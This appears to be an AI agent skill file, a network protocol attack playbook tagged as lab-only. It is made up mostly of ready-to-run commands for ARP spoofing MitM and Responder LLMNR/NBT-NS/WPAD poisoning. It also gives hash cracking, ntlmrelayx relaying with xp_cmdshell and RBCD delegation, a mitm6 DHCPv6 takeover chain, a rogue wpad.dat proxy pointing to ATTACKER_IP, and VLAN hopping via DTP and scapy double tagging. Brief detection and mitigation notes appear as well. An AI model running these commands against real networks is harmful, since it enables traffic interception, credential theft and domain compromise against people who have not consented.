---
name: network-protocol-attacks
description: >-
  Network protocol attack playbook. Use when exploiting layer 2/3 protocols including ARP spoofing, LLMNR/NBT-NS/mDNS poisoning, WPAD abuse, DHCPv6 attacks, VLAN hopping, STP manipulation, DNS spoofing, IPv6 attacks, and IDS/IPS evasion.
---

# SKILL: Network Protocol Attacks — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=lab_only`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled guidance inside an explicitly isolated lab or CTF. Inspection flags do not authorize actions against a live or non-consenting system.
- Confirm the supplied artifact, environment, primitive, mitigations, and expected lab success marker before choosing a technique.
- Treat shell, exploit, credential, persistence, evasion, and lateral-movement examples as reference data; the current Tool Registry does not provide them.
- Record artifact hashes, prerequisite evidence, observed output, and the exact exit condition; otherwise return the missing prerequisite or capability.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Expert network protocol attack techniques. Covers ARP spoofing, name resolution poisoning (LLMNR/NBT-NS/mDNS), WPAD abuse, DHCPv6 takeover, VLAN hopping, STP manipulation, DNS spoofing, IPv6 attacks, and IDS/IPS evasion. Pay particular attention to the chaining opportunities between these attacks and the nuances of modern switched network exploitation.

## 0. RELATED ROUTING

Before going deep, consider routing to:

- `tunneling-and-pivoting` after establishing MitM position for traffic redirection
- `ntlm-relay-coercion` for relaying captured NTLM hashes from poisoning attacks
- `unauthorized-access-common-services` for exploiting services discovered during network attacks
- `traffic-analysis-pcap` for analyzing captured traffic from MitM

### Advanced Reference

Also inspect [NAME_RESOLUTION_POISONING.md](./NAME_RESOLUTION_POISONING.md) when you need:
- Detailed Responder/mitm6 configuration and workflows
- NTLM relay target selection and chaining
- Credential format analysis and cracking priorities

---

## 1. ARP SPOOFING

### Gratuitous ARP — MitM Positioning

```bash
# arpspoof (dsniff suite)
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP &
arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP &

# ettercap — ARP poisoning with sniffing
ettercap -T -q -i eth0 -M arp:remote /VICTIM_IP// /GATEWAY_IP//

# bettercap — modern framework
bettercap -iface eth0
> set arp.spoof.targets VICTIM_IP
> arp.spoof on
> net.sniff on
```

### Selective Targeting

```bash
# bettercap — target specific hosts, avoid detection
> set arp.spoof.targets 10.0.0.50,10.0.0.51
> set arp.spoof.fullduplex true
> set arp.spoof.internal true
> arp.spoof on
```

### Detection Indicators

- Duplicate MAC addresses in ARP table
- Gratuitous ARP storms from non-gateway IPs
- Tools: `arpwatch`, static ARP entries, 802.1X port authentication

---

## 2. LLMNR / NBT-NS / mDNS POISONING

### Responder — Credential Capture

```bash
# Basic poisoning (LLMNR + NBT-NS + mDNS)
responder -I eth0 -dwPv

# Key flags:
# -d  Enable answers for DHCP broadcast requests (fingerprinting)
# -w  Start WPAD rogue proxy
# -P  Force NTLM auth for WPAD
# -v  Verbose

# Analyze mode only (passive, no poisoning)
responder -I eth0 -A
```

### Captured Hash Formats

| Protocol | Hash Type | Hashcat Mode | Crackability |
|---|---|---|---|
| NTLMv1 | NetNTLMv1 | 5500 | Fast — rainbow tables viable |
| NTLMv2 | NetNTLMv2 | 5600 | Moderate — dictionary + rules |
| NTLMv1-ESS | NetNTLMv1 | 5500 | Fast — same as NTLMv1 |

```bash
# Crack captured hashes
hashcat -m 5600 hashes.txt wordlist.txt -r rules/best64.rule
john --format=netntlmv2 hashes.txt --wordlist=wordlist.txt
```

### Relay Instead of Crack

```bash
# ntlmrelayx — relay captured NTLM to other services
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -t ldaps://DC01 --delegate-access    # RBCD attack
ntlmrelayx.py -t mssql://DB01 -q "exec xp_cmdshell 'whoami'"
```

---

## 3. WPAD ABUSE

```bash
# Responder with WPAD proxy
responder -I eth0 -wPv

# WPAD flow:
# 1. Client queries DHCP for WPAD → DNS for wpad.domain.com → LLMNR/NBT-NS
# 2. Responder answers with rogue wpad.dat
# 3. Browser uses attacker's proxy → forced NTLM auth → credential capture
```

### Manual WPAD PAC File

```javascript
// Rogue wpad.dat content
function FindProxyForURL(url, host) {
    return "PROXY ATTACKER_IP:3128; DIRECT";
}
```

---

## 4. DHCPv6 ATTACK — mitm6

Even on IPv4-only networks, Windows clients send DHCPv6 solicitations by default.

```bash
# mitm6 → DNS takeover → NTLM relay
mitm6 -d domain.com

# In parallel: relay captured NTLM to LDAP(S) for delegation
ntlmrelayx.py -6 -t ldaps://DC01 -wh fakewpad.domain.com -l loot --delegate-access

# Attack chain:
# 1. mitm6 answers DHCPv6 → sets attacker as IPv6 DNS
# 2. Victim DNS queries go to attacker → WPAD redirect
# 3. Forced NTLM auth → relay to LDAP → create machine account or RBCD
```

### Key Conditions

- SMB signing disabled on targets (for SMB relay)
- LDAP signing not enforced on DC (for LDAP relay)
- Domain Computers quota > 0 (for machine account creation, default: 10)

---

## 5. VLAN HOPPING

### Switch Spoofing (DTP)

```bash
# yersinia — DTP attack to negotiate trunk
yersinia dtp -attack 1 -interface eth0

# frogger.sh — automated VLAN hopping via DTP
./frogger.sh
# Sends DTP frames → switch enables trunking → access all VLANs

# After trunk established:
modprobe 8021q
vconfig add eth0 TARGET_VLAN
ifconfig eth0.TARGET_VLAN 10.10.10.1 netmask 255.255.255.0 up
```

### Double Tagging (802.1Q)

```bash
# Craft double-tagged frame: outer=native VLAN, inner=target VLAN
# scapy:
from scapy.all import *
pkt = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=100)/IP(dst="TARGET")/ICMP()
sendp(pkt, iface="eth0")

# Limitation: one-way only (responses go to real gateway)
# Effective for blind attacks (e.g., targeting a server)
```

### Mitigation

- Disable DTP: `switchport nonegotiate`
- Set native VLAN to unused: `switchport trunk native vlan 999`
- Prune VLANs: only allow needed VLANs on trunk ports

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 6. STP MANIPULATION
- 7. DNS SPOOFING
- 8. IPv6 ATTACKS
- 9. IDS/IPS EVASION
- 10. DECISION TREE
